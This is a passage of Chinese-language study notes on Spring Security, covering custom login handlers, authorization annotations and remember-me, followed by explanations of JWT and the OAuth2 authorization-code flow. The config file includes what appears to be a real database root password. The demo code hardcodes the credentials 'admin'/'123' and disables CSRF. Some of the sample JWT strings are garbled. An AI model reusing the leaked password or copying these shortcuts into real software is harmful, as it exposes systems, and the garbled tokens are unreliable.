PreAuthorize的表达式允许ROLE_开头，也可以不以ROLE_开头。\n\t@PreAuthorize(\"hasRole('abc')\")\n\t@RequestMapping(\"/main10\")\n\tpublic String main10(){\n\t\tSystem.out.println(\"执行登陆操作\");\n\t\treturn \"redirect:main10.html\";\n\t}\n\n\t@PostMapping(\"/toMain\")\n\tpublic String toMain(){\n\t\treturn \"redirect:main.html\";\n\t}\n\n\t@PostMapping(\"/toError\")\n\tpublic String toError(){\n\t\treturn \"redirect:error.html\";\n\t}\n}\n```\n\n**<span id=\"MyAccessDeniedHandler\">MyAccessDeniedHandler.java</span>**\n```java\n@Component\npublic class MyAccessDeniedHandler implements AccessDeniedHandler {\n\n\t@Override\n\tpublic void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e) throws IOException, ServletException {\n\t\t//设置响应状态码\n\t\thttpServletResponse.setStatus(HttpServletResponse.SC_FORBIDDEN);\n\t\thttpServletResponse.setHeader(\"Content-Type\", \"application/json;charset=utf-8\");\n\t\tPrintWriter writer = httpServletResponse.getWriter();\n\t\twriter.write(\"{\\\"status\\\":\\\"error\\\", \\\"msg\\\":\\\"权限不足，请联系管理员\\\"}\");\n\t\twriter.flush();\n\t\twriter.close();\n\t}\n}\n```\n\n**<span id=\"MyAuthenticationFailureHandler\">MyAuthenticationFailureHandler.java</span>**\n```java\n@Component\npublic class MyAuthenticationFailureHandler implements AuthenticationFailureHandler {\n\n\tprivate String url;\n\n\tpublic MyAuthenticationFailureHandler(String url){\n\t\tthis.url = url;\n\t}\n\n\t@Override\n\tpublic void onAuthenticationFailure(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException {\n\t\thttpServletResponse.sendRedirect(url);\n\t}\n}\n```\n\n**<span id=\"MyAuthenticationSuccessHandler\">MyAuthenticationSuccessHandler.java</span>**\n```java\n@Component\npublic class MyAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n\n\tprivate String url;\n\n\tpublic MyAuthenticationSuccessHandler(String url){\n\t\tthis.url = url;\n\t}\n\n\t@Override\n\tpublic void onAuthenticationSuccess(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Authentication authentication) throws IOException, ServletException {\n\t\tUser user = (User) authentication.getPrincipal();\n\t\tSystem.out.println(user.getUsername());\n\t\t//springsecurity出于安全原因，user.getPassword()得到的是null\n\t\tSystem.out.println(user.getPassword());\n\t\tSystem.out.println(user.getAuthorities());\n\t\thttpServletResponse.sendRedirect(url);\n\t}\n}\n```\n\n**<span id=\"MyService\">MyService.java</span>**\n```java\n@Service\npublic class MyService {\n\tpublic boolean hasPermission(HttpServletRequest request, Authentication authentication){\n\t\tObject obj = authentication.getPrincipal();\n\t\tif(obj instanceof UserDetails){\n\t\t\tUserDetails userDetails = (UserDetails) obj;\n\t\t\tCollection<? extends GrantedAuthority> authorities = userDetails.getAuthorities();\n\t\t\treturn authorities.contains(new SimpleGrantedAuthority(\"admin\"));\n\t\t}\n\t\treturn false;\n\t}\n}\n```\n**<span id=\"UserDetailsServiceImpl\">UserDetailsServiceImpl.java</span>**\n```java\n@Service\npublic class UserDetailsServiceImpl implements UserDetailsService {\n\n\t@Autowired\n\tprivate PasswordEncoder pw;\n\n\t@Override\n\tpublic UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\t\t//这一步是在模拟判断从前端传来的username是否存在于数据库中，如果不存在则抛出UsernameNotFoundException异常\n\t\tif(!\"admin\".equals(username))\t{\n\t\t\tthrow new UsernameNotFoundException(\"用户名不存在!\");\n\t\t}\n\n\t\t//模拟根据前端传来的username从数据库中获取到了其密码。\n\t\t//这里要用pw进行加密的原因：我们再前端密码输入框中输入123后，springsecurity会自动将其通过你设置的密码解析器进行加密。后续的认证过程的密码都是加密后的密码\n\t\tString password = pw.encode(\"123\");\n\n\t\t//这里的admin,normal是用户拥有的权限, 而ROLE_abc表示该用户属于abc角色。注: 该用户不是属于ROLE_abc角色，“ROLE_”前缀只是用来与权限名相区别开\n\t\t//权限名与角色名是严格区分大小写的\n\t\treturn new User(username, password, AuthorityUtils.commaSeparatedStringToAuthorityList(\"admin,normal,ROLE_abc\"));\n\t}\n}\n```\n\n**<span id=\"SpringsecurityApplication\">SpringsecurityApplication.java</span>**\n```java\n@SpringBootApplication\n@EnableGlobalMethodSecurity(securedEnabled = true, prePostEnabled = true)//开启@Secured、@PreAuthorize注解\npublic class SpringsecurityApplication {\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SpringsecurityApplication.class, args);\n\t}\n}\n```\n\n**<span id=\"applicationProperties\">application.properties</span>**\n```\n# 应用名称\nspring.application.name=springsecurity\n# 应用服务 WEB 访问端口\nserver.port=8080\n\nspring.datasource.driver-class-name= com.mysql.cj.jdbc.Driver\nspring.datasource.url= jdbc:mysql://localhost:3306/security?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai\nspring.datasource.username= root\nspring.datasource.password= whz1152957995\n```\n**<span id=\"login\">login.html</span>**\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"UTF-8\">\n\t<title>login</title>\n</head>\n<body>\n<form action=\"/login\" method=\"post\">\n\tusername: <input type=\"text\" name=\"username123\"/><br/>\n\tpassword: <input type=\"password\" name=\"password123\"/><br/>\n\t记住我:<input type=\"checkbox\" name=\"remember-me\" value=\"true\"/>\n\t<input type=\"submit\" value=\"login\">\n</form>\n</body>\n</html>\n```\n\n**<span id=\"main\">main.html</span>**\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"UTF-8\">\n\t<title>success</title>\n</head>\n<body>\nsuccess！！！\n<a href=\"/Mylogout\">退出登陆</a>\n</body>\n</html>\n```\n## 自定义登陆逻辑\nsecurityConfig配置文件\n```java\n@Configuration\npublic class SecurityConfig {\n  //设置是使用BCryptPasswordEncoder加密\n\t@Bean\n\tpublic PasswordEncoder getPw(){\n\t\treturn new BCryptPasswordEncoder();\n\t}\n}\n```\n登陆逻辑代码\n```java\n@Service\npublic class UserDetailsServiceImpl implements UserDetailsService {\n\t@Autowired\n\tprivate PasswordEncoder pw;\n\n\t@Override\n\tpublic UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\t\t//这一步是在模拟判断从前端传来的username是否存在于数据库中，如果不存在则抛出UsernameNotFoundException异常\n\t\tif(!\"admin\".equals(username))\t{\n\t\t\tthrow new UsernameNotFoundException(\"用户名不存在!\");\n\t\t}\n\t\t//模拟根据前端传来的username从数据库中获取到了其密码。\n\t\t//这里要用pw进行加密的原因：我们再前端密码输入框中输入123后，springsecurity会自动将其通过你设置的密码解析器进行加密。后续的认证过程的密码都是加密后的密码\n\t\tString password = pw.encode(\"123\");\n\t\treturn new User(username, password, AuthorityUtils.commaSeparatedStringToAuthorityList(\"admin,normal\"));//这里的admin,normal权限我们自定义的\n\t}\n}\n```\n运行后，只有用户名为admin，密码为123的用户才能登陆\n\n\n## successForwardUrl方法与successHandler方法的区别\nsuccessFrowardUrl方法的底层代码如下：\n```java\npublic FormLoginConfigurer<H> successForwardUrl(String forwardUrl) {\n  this.successHandler(new ForwardAuthenticationSuccessHandler(forwardUrl));\n  return this;\n}\n```\n```java\npublic class ForwardAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n  private final String forwardUrl;\n  public ForwardAuthenticationSuccessHandler(String forwardUrl) {\n    Assert.isTrue(UrlUtils.isValidRedirectUrl(forwardUrl), () -> {\n      return \"'\" + forwardUrl + \"' is not a valid forward URL\";\n    });\n    this.forwardUrl = forwardUrl;\n  }\n  public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n    request.getRequestDispatcher(this.forwardUrl).forward(request, response);\n  }\n}\n```\n由此使用successForwardUrl方法，认证成功后是通过**请求转发**来跳转到页面的。\n\n如果我们想要通过**重定向**的方法来跳转到页面的话，我们需要自己实现AuthenticationSuccessHandler接口，然后使用successHandler()来指定认证成功后需要做的事情\n\n\n## 认证的公式\n```java\nhttp.authorizeRequests()\n  .antMatchers(\"/error.html\").permitAll()\n  ....\n  .匹配的url.认证控制\n```\n### 其中用于`匹配的url`的方法有如下几种：\n**anyRequest()**: 匹配任何请求\n\n**antMatcher()**\n方法定义如下：\n```java\npublic C antMathcers(HttpMethod method, String... antPatterns) {\npublic C antMatchers(String... antPatterns)\n```\n参数是可变参数，每个参数是一个ant路径表达式，用于匹配url规则\n\n**regexMatchers()**\n方法定义如下：\n```java\npublic C regexMatchers(HttpMethod method, String... regexPatterns) {\npublic C regexMatchers(String... regexPatterns)\n```\n\nregexPatterns形参是可变参数，每个参数是一个正则表达式，用于匹配url规则\n\n\n### 其中用于`认证控制`的方法有如下几种\n- permitAll(): 允许任何人访问\n- denyAll() : 不允许任何人访问\n- anonymous()\n- authenticated()： 所有人需要进行认证才能访问\n- fullyAuthenticated()\n- rememberMe()\n- hasAuthority()\n- hasAnyAuthority()\n- hasRole()\n- hasAnyrole()\n- hasIpAddress()\n- access()\n\n**access()方法的使用**\n上述`认证控制`的方法实际上底层实现都是调用access(表达式)\n以permitAll()为例：\n```java\npublic ExpressionUrlAuthorizationConfigurer<H>.ExpressionInterceptUrlRegistry permitAll() {\n  return this.access(\"permitAll\");\n}\n```\n通过access()我们可以自己写一个`认证控制`\n\n### 基于注解的权限控制\n在Spring Security中提供了一些认证控制的注解。这些注解默认都是不可用的，需要通过在启动类上添加`@EnableGlobalMethodSecurity`进行开启后使用\n如果设置的条件允许，程序正常执行。如果不允许会报500，`org.springframework.security.access.AccessDeniedExceptin:不允许访问`\n\n用于权限控制的注解可以写到Service类或方法上也可以写道Controller类或Controller的方法上，通常都是写在Controller的方法上的，来控制url是否允许被访问\n\n**@Secured**\n`@Secured`是专门用来判断是否具有角色的。能写在方法或类上。参数要以ROLE_开头\n开启注解：`@EnableGlobalMethodSecurity(securedEnabled=true)`\n\n**@PreAuthorize/@PostAuthorize**\n@PreAuthorize：在访问方法或类在执行之前先认证，大多情况下都是使用这个注解，注解的参数和access()方法参数取值方式相同，都是权限表达式\n@PostAuthorize表示方法或类执行结束后再认证，此注解很少被使用\n\n开启注解：`@EnableGlobalMethodSecurity(prePostEnabled=true)`\n\n## RememberMe功能实现\nspringSecurity中RmemeberMe为“记住我”功能，用户只需要再登陆时添加name为remember-me的复选框。当取值为true时，springSecurity会自动把用户信息存储到数据源中，以后就可以不登陆进行访问了，默认的有效时间为2周\n\n## spring security 获取用户信息\n本文描述在spring security中如何获取用户信息。分别介绍几种常用的方法实现。\n\n### 通过Bean获取用户\n获取当前认证用户(authenticated principal)最简单的方式是通过SecurityContextHolder类的静态方法：\n```java\nAuthentication authentication = SecurityContextHolder.getContext().getAuthentication();\nString currentPrincipalName = authentication.getName();\n```\n下面是改进版本代码，获取前首先检查是否存在认证用户：\n```java\nAuthentication authentication = SecurityContextHolder.getContext().getAuthentication();\nif (!(authentication instanceof AnonymousAuthenticationToken)) {\n    String currentUserName = authentication.getName();\n    return currentUserName;\n}\n```\n当然，静态调用的缺点是代码的可测试性明显降低。我们继续探索新的方式实现。\n\n### 在控制器中获取用户\n在@Controller 注解的bean里，有额外的选项。principal 可以直接作为方法参数，框架会自动赋值。\n```java\n@Controller\npublic class SecurityController {\n \n    @RequestMapping(value = \"/username\", method = RequestMethod.GET)\n    @ResponseBody\n    public String currentUserName(Principal principal) {\n        return principal.getName();\n    }\n}\n```\n或者也可以使用认证信息：\n```java\n@Controller\npublic class SecurityController {\n \n    @RequestMapping(value = \"/username\", method = RequestMethod.GET)\n    @ResponseBody\n    public String currentUserName(Authentication authentication) {\n        return authentication.getName();\n    }\n}\n```\n框架为了尽可能的灵活，Authentication 类的API很方便使用。因此，通过转换可以返回principal对象。\n```java\nUserDetails userDetails = (UserDetails) authentication.getPrincipal();\nSystem.out.println(\"User has authorities: \" + userDetails.getAuthorities());\n```\n最后一种方式直接通过http request：\n```java\n```java\n@Controller\npublic class SecurityController {\n \n    @RequestMapping(value = \"/username\", method = RequestMethod.GET)\n    @ResponseBody\n    public String currentUserNameSimple(HttpServletRequest request) {\n        Principal principal = request.getUserPrincipal();\n        return principal.getName();\n    }\n}\n```\n### 通过自定义接口获取用户信息\n为了充分利用spring的依赖注入功能，可以在在任何地方获取认证信息，不仅仅是@Controller注解的bean，我们通过简单的门面隐藏静态访问：\n```java\npublic interface IAuthenticationFacade {\n    Authentication getAuthentication();\n}\n\n@Component\npublic class AuthenticationFacade implements IAuthenticationFacade {\n \n    @Override\n    public Authentication getAuthentication() {\n        return SecurityContextHolder.getContext().getAuthentication();\n    }\n}\n```\n该门面暴露了认证对象并隐藏静态访问代码，让业务解耦并方便测试：\n```java\n@Controller\npublic class SecurityController {\n    @Autowired\n    private IAuthenticationFacade authenticationFacade;\n \n    @RequestMapping(value = \"/username\", method = RequestMethod.GET)\n    @ResponseBody\n    public String currentUserNameSimple() {\n        Authentication authentication = authenticationFacade.getAuthentication();\n        return authentication.getName();\n    }\n}\n```\n### 在jsp中获取用户信息\n当前认证用户也可以在jsp页面中获取到。利用spring security标签支持。首先我们需要在页面中定义标签：\n```java\n<%@ taglib prefix=\"security\" uri=\"http://www.springframework.org/security/tags\" %>\n```\n然后，我们可以引用principal：\n```java\n<security:authorize access=\"isAuthenticated()\">\n    authenticated as <security:authentication property=\"principal.username\" /> \n</security:authorize>\n```\n\n# JWT和Oauth2的区别和联系\n**JWT**\n提供了一种用于发布接入令牌（Access Token),并对发布的签名接入令牌进行验证的方法。 令牌（Token）本身包含了一系列声明，应用程序可以根据这些声明限制用户对资源的访问。\nJWT是一种安全标准。**基本思路就是用户提供用户名和密码给认证服务器，服务器验证用户提交信息信息的合法性；如果验证成功，会产生并返回一个Token（令牌），用户可以使用这个token访问服务器上受保护的资源。**\n\n**Oauth**\nOAuth是一个关于授权（authorization）的开放网络协议，在全世界得到广泛应用，目前的版本是2.0版。\nOAuth是一种安全的授权框架，提供了一套详细的授权机制。用户或应用可以通过公开的或私有的设置，授权第三方应用访问特定资源。它详细描述了系统中不同角色、用户、服务前端应用（比如API），以及客户端（比如网站或移动App）之间怎么实现相互认证。\nOauth2定义了一组相当复杂的规范。涉及到：Roles角色、Client Types客户端类型、Client Profile客户端描述、Authorization Grants认证授权、Endpoints终端等。\n\n\n## JWT详解\nJson web token（JWT）是为了网络应用环境间传递声明而执行的一种基于JSON的开发标准（RFC 7519），它定义了一种简介的、自包含的协议格式，用于在通信双方传递json对象token，传递的信息经过数字签名可以被验证和信任， 该token被设计为紧凑且安全的，特别适用于分布式站点的单点登陆（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。\n\nJWT令牌的优点：\n- jwt基于json，非常方便解析。\n- 可以在令牌中自定义丰富的内容，易扩展。\n- 通过非对称加密算法及数字签名技术，JWT防止篡改，安全性高。\n- 资源服务使用WT可不依赖认证服务即可完成授权。\n缺点：\n- JWT令牌较长，占存储空间比较大。\n\n**基于session认证所显露的问题**\n- Session：每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大\n- 扩展性：用户认证之后，服务端做认证记录，如果认证的记录被保存在内存的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，这样在分布式的应用上，响应的限制了负载均衡器的能力，也意味着限制了应用的扩展性\n- CSRF：因为是基于cookie来进行用户识别的，cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击\n\n### JWT组成\nJWT是由三部分构成（用.分隔），将这三段信息文本用链接构成了JWT字符串。就像这样\n```\nxxxxx.yyyyy.zzzzz\n```\n第一部分：头部（header）\n第二部分：载荷（payload，该token里携带的有效信息。比如用户id、名字、年龄等等）\n第三部分：签名（signature）\n\n#### 头部（Header）\n头部用于描述关于该JWT的最基本的信息，例如其类型（即JWT）以及签名所用的算法(如HMAC SHA256或RSA)等。这也可以被表示成一个JSON对象。\n```json\n{\n\t\"alg\": \"HS256\",\n\t\"typ\": \"JWT\"\n}\n```\n- typ：是类型。\n- alg：签名的算法，这里使用的算法是HS256算法\n我们对头部的json字符串进行BASE64编码（网上有很多在线编码的网站），编码后的字符串如下：\n```\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n```\nBase64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。JDK中提供了非常方便的BASE64Encoder和BASE64Decoder，用它们可以非常方便的完成基于BASE64的编码和解码。\n\n#### 载荷(Payload)\n第二部分是载荷，就是存放有效信息的地方。这里放声明内容，可以说就是存放沟通讯息的地方，在定义上有3种声明（Claims）：\n- **Registered claims（注册声明）**\n这些是一组预先定义的声明，它们不是强制性的，但推荐使用，以提供一组有用的，可互操作的声明。 其中一些是：iss（发行者），exp（到期时间），sub（主题），aud（受众）等。\n```\niss: jwt签发者\nsub: jwt所面向的用户\naud: 接收jwt的一方\nexp: jwt的过期时间，这个过期时间必须要大于签发时间\nnbf: 定义在什么时间之前，该jwt都是不可用的.\niat: jwt的签发时间\njti: jwt的唯一身份标识，主要用来作为一次性token，从而回澄重放攻击。\n```\n- **Public claims（公开声明）**\n公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.\n- **Private claims（私有声明）**\n私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。\n这个指的就是自定义的claim。比如下面那个举例中的name都属于自定的claim。这些claim跟JWT标准规定的claim区别在于：JWT规定的claim，JWT的接收方在拿到JWT之后，都知道怎么对这些标准的claim进行验证（还不知道是否能够验证）；而private claims不会验证，除非明确告诉接收方要对这些claim进行验证以及规则才行。\n\n载荷实例：\n```json\n{\n\t\"sub\": \"1234567890\",\n\t\"name\": \"John Doe\",\n\t\"iat\": 1516239022\n}\n```\n其中sub是标准的声明，name是自定义的声明（公共的或私有的）\n然后将其进行base64编码，得到jwt的第二部分：\n```\ney]zdwrioiIxMjMONTY30DkwriwibmFtZSI6IkphbwvzIiwiwRtaw4ionRydwv9\n```\n\n#### 签证/签名(Signature)\njwt的第三部分是一个签证信息，用来验证发送请求者身份，由前两部分加密形成。这个签证信息由三部分组成：\n- header（base64后的）\n- payload（base64后的）\n- secret（盐，一定要保密）\n这个部分需要base64加密后的header和base64加密后的payload使用，连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分：\n```\n8HI-LodOncfVonbKIPJJqLH998duF9DSDGkx3gRPNVI\n```\n\n将这三部分用`.`连接成一个完整的字符串，构成了最终的jwt：\n```\neyJhbscioi]IUzI1NiIsInRScCI6IkpXVCJ9.eyJzdwrioiIxMjMoNTY30DkwriwibmFtZSI6IkpvaG4gRG91riwiaMFOIjOxNTE2MjM5MDIyfQ.8HI-LodOncfVonbKIPJJqLH998duF9DSDGkx3gRPNVI\n```\n注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了\n\n### JWT实战\n**依赖**\n```xml\n<dependency>\n\t<groupId>io.jsonwebtoken</groupId>\n\t<artifactId>jjwt</artifactId>\n\t<version>0.9.0</version>\n</dependency>\n```\n```java\n@SpringBootTest\nclass JjwtApplicationTests {\n\n\t@Test\n\tvoid contextLoads() {\n\t\tMap adminClaims = new HashMap();\n\t\tadminClaims.put(\"age\", \"18\");\n\n\t\t//创建JwtBuilder对象\n\t\tJwtBuilder jwtBuilder = Jwts.builder()\n\t\t\t\t// 声明的标识{'jti':'8888'}\n\t\t\t\t.setId(\"8888\")\n\t\t\t\t// 主体，用户{'sub':\"Rose\"}\n\t\t\t\t.setSubject(\"Rose\")\n\t\t\t\t// 设置token创建的日期{'ita':\"xxxxxx\"}\n\t\t\t\t.setIssuedAt(new Date())\n\t\t\t\t//设置token有效时间为1分钟\n\t\t\t\t.setExpiration(new Date(System.currentTimeMillis() + 60 * 1000))\n\t\t\t\t//设置签名的算法与盐，第一个参数为算法，第二个参数为盐\n\t\t\t\t.signWith(SignatureAlgorithm.HS256, \"xxxx\")\n\t\t\t\t// 自定义申明\n\t\t\t\t.claim(\"roles\", \"admin\")\n\t\t\t\t.claim(\"logo\", \"xxx.png\")\n\t\t\t\t//通过传入map的方式来自定义申明\n\t\t\t\t.addClaims(adminClaims);\n\n\t\t//获取jwt的token\n\t\tString token = jwtBuilder.compact();\n\t\tSystem.out.println(token); //输出：eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI4ODg4Iiwic3ViIjoiUm9zZSIsImlhdCI6MTYxODIxODQ4OH0.elU_nO63OLxc7rVyIaIWAZRLx1Ocu35Lc32GqHbXFNs\n\t\tSystem.out.println(\"=================\");\n\n\t\t//对token解密\n\t\tString[] split = token.split(\"\\\\.\");\n\t\tSystem.out.println(Base64Codec.BASE64.decodeToString(split[0])); //输出：{\"alg\":\"HS256\"}\n\t\tSystem.out.println(Base64Codec.BASE64.decodeToString(split[1])); //输出：{\"jti\":\"8888\",\"sub\":\"Rose\",\"iat\":161821848}\n\t\t// 无法解密签名, 因为签名过程涉及到了盐secret, 所以输出的是乱码\n\t\tSystem.out.println(Base64Codec.BASE64.decodeToString(split[2]));//输出：zU';��/\u0017;�\\�h��e\u0012���.ߒ��a�\u001d��\n\t\tSystem.out.println(\"=================\");\n\n\t\t//解析token获取载荷中声明的对象\n\t\tClaims claims = Jwts.parser()\n\t\t\t\t//指定盐来解密token\n\t\t\t\t.setSigningKey(\"xxxx\")\n\t\t\t\t.parseClaimsJws(token)\n\t\t\t\t.getBody();\n\t\tSystem.out.println(\"id:\"+ claims.getId()); //输出：id:8888\n\t\tSystem.out.println(\"subject:\"+claims.getSubject()); //输出：subject:Rose\n\n\t\tSimpleDateFormat simpleDateFormat = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\t\ttry{\n\t\t\tThread.sleep(3 * 1000);\n\t\t}catch (Exception e){\n\t\t\te.printStackTrace();\n\t\t}\n\t\tSystem.out.println(\"签发时间：\"+simpleDateFormat.format(claims.getIssuedAt()));// 输出：签发时间：2021-04-12 17:30:04\n\t\tSystem.out.println(\"过期时间：\"+simpleDateFormat.format(claims.getExpiration()));//输出：过期时间：2021-04-12 17:31:04\n\t\tSystem.out.println(\"当前时间：\"+simpleDateFormat.format(new Date()));//输出：当前时间：2021-04-12 17:30:07\n\n\t\tSystem.out.println(\"roles:\"+claims.get(\"roles\")); //输出：admin\n\t\tSystem.out.println(\"logo:\"+claims.get(\"logo\"));//输出：xxx.png\n\t\tSystem.out.println(\"age:\"+claims.get(\"age\"));//输出：18\n\t}\n}\n```\n\n### Spring Security 中实现接口 Jwt 认证\n**定义 Json Web Token 过滤器**\n无论上面提到的哪种认证方式，我们都可以使用 Spring Security 中的 Filter 来处理。 Spring Security 默认的基础配置没有提供对 Bearer Authentication 处理的过滤器， 但是提供了处理 Basic Authentication 的过滤器：\n通过查看`BasicAuthentication`源码发现，它继承了OncePerRequestFilter类，我们所以我们也模仿 BasicAuthenticationFilter 来实现自己的 JwtAuthenticationFilter。 完整代码如下：\n```java\n/**\n  * jwt 认证拦截器 用于拦截 请求 提取jwt 认证\n  *\n  * @author dax\n  * @since 2019/11/7 23:02\n  */\n\t@Component\n public class JwtAuthenticationFilter extends OncePerRequestFilter {\n     @Override\n     protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws IOException, ServletException {\n\n\t\t\t   ....\n\n         chain.doFilter(request, response);\n     }\n }\n```\n**配置 JwtAuthenticationFilter**\n首先将过滤器 JwtAuthenticationFilter 注入 Spring IoC 容器 ，然后一定要将 JwtAuthenticationFilter 顺序置于 UsernamePasswordAuthenticationFilter 之前：\n```java\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n\thttp.csrf().disable()\n\t\t\t\t\t.and()\n\t\t\t\t\t.addFilterBefore(preLoginFilter, UsernamePasswordAuthenticationFilter.class)\n\t\t\t\t\t// jwt必须配置于 UsernamePasswordAuthenticationFilter 之前\n\t\t\t\t\t.addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)\n}\n```\n\n## OAuth2.0详解\n第三方认证技术方案最主要是解决认证协议的通用标准问题，因为要实现跨系统认证，各系统之间要遵循一定的接口协议。\nOAUTH协议为用户资源的授权提供了一个安全的、开放而又简易的标准。同时，任何第三方都可以使用OAUTH认证服务，任何服务提供商都可以实现自身的OAUTH认证服务，因而OAUTH是开放的。业界提供了OAUTH的多种实现如PHP、JavaScript，Java，Ruby等各种语言开发包，大大节约了程序员的时间，因而OAUTH是简易的。互联网很多服务如OpenAPI，很多大公司如Google，Yahoo，Microsoft等都提供了OAUTH认证服务，这些都足以说明OAUTH标准逐渐成为开放资源授权的标准。\noauth协议目前发展到2.0版本，1.0版本过于复杂，2.0版本已得到广泛应用。\n\n**举个例子**\n你想登录豆瓣去看看电影评论，但你丫的从来没注册过豆瓣账号，又不想新注册一个再使用豆瓣，怎么办呢？不用担心，豆瓣已经为你这种懒人做了准备，用你的qq号可以授权给豆瓣进行登录，请看：\n第一步：在豆瓣官网点击用qq登录\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161449.png)\n\n第二步：跳转到qq登录页面输入用户名密码，然后点授权并登录\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161457.png)\n\n第三步：跳回到豆瓣页面，成功登录\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161507.png)\n\n我们发现，我们竟然用QQ帐号登录进了豆瓣的系统里。到底发生了什么？\n页面经历了从豆瓣到qq，再从qq到豆瓣的两次页面跳转。简单来说，上述例子中的豆瓣就是客户端，QQ就是认证服务器，OAuth2.0就是客户端和认证服务器之间由于相互不信任而产生的一个授权协议。\n其实整个过程，用下面这一张图，\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161517.png)\n\n备注：所用到的请求路径名称都是虚构的，所附带的请求参数忽略了一些非重点的。\n\n1. 第一步：在豆瓣官网点击用qq登录\n当你点击用qq登录的小图标时，实际上是向豆瓣的服务器发起了一个 http://www.douban.com/leadToAuthorize 的请求，豆瓣服务器会响应一个重定向地址，指向qq授权登录\n浏览器接到重定向地址 http://www.qq.com/authorize?callback=www.douban.com/callback，再次访问。并注意到这次访问带了一个参数是callback，以便qq那边授权成功再次让浏览器发起这个callback请求。不然qq怎么知道你让我授权后要返回那个页面啊，每天像豆瓣这样的需要QQ授权的网站这么多。\n\n2. 第二步：跳转到qq登录页面输入用户名密码，然后点授权并登录\n上一步中浏览器接到重定向地址并访问 http://www.qq.com/authorize?callback=www.douban.com/callback\n这时候来到的页面是QQ这边的登录授权页面。当访问QQ服务器验证用户名密码成功后，该方法会响应浏览器一个重定向地址，并附上一个code（**授权码**）。而这个授权码，就是豆瓣这边关心的了，因为豆瓣才不管QQ那边是怎么授权的呢。\n\n3. 第三步：跳回到豆瓣页面，成功登录\n这一步背后的过程其实是最繁琐的，但对于用户来说是完全感知不到的（所以你看页面上消耗的时间一般都比较长，长达好几秒）。用户在QQ登录页面点击授权登陆后，就直接跳转到豆瓣首页了，但其实经历了很多隐藏的过程。\n\nQQ服务器在判断登录成功后，使页面重定向到之前豆瓣发来的callback的URL并且附上QQ自己提供的code授权码，即 callback=www.douban.com/callbackwithauthcode\n\n当发送这个请求到豆瓣的服务器的时候，就复杂了，主要做了两件事（模拟了两次请求）：\n\n用拿到的授权码code去换token（和QQ服务器交互）\n用拿到的token换取用户信息，比如用户名、头像等等信息（和QQ服务器交互）\n最后信息拿到后，豆瓣这边就把你的信息存下来，返回到首页给你看。这样就完成了一套完整的授权。QQ服务器成功的把你的qq信息授权交给豆瓣了，完美\n\n**访问过程：**\n1. 用户进入网站的登录页面，点击微信的图标以微信账号登录系统，用户是自己在微信里信息的资源拥有者。\n2. 资源拥有者同意给客户端授权\n资源拥有者扫描二维码表示资源拥有者同意给客户端授权，微信会对资源拥有者的身份进行验证，验证通过后，微信会询问用户是否给授权网站访问自己的微信数据，用户点击“确认登录”表示同意授权，微信认证服务器会颁发一个授权码，并重定向到网站。\n3. 客户端获取到授权码，请求认证服务器申请令牌\n此过程用户看不到，客户端应用程序请求认证服务器，请求携带授权码。\n4. 认证服务器向客户端响应令牌\n认证服务器验证了客户端请求的授权码，如果合法则给客户端颁发令牌，令牌是客户端访问资源的通行证。此交互过程用户看不到，当客户端拿到令牌后，用户在网站看到已经登录成功。\n5. 客户端请求资源服务器的资源\n客户端携带令牌访问资源服务器的资源。网站携带令牌请求访问微信服务器获取用户的基本信息。\n6. 资源服务器校验令牌的合法性，如果合法则向用户响应资源信息内容。\n注意：资源服务器和认证服务器可以是一个服务也可以分开的服务，如果是分开的服务资源服务器通常要请求认证服务器来校验令牌的合法性。\n\n\n### 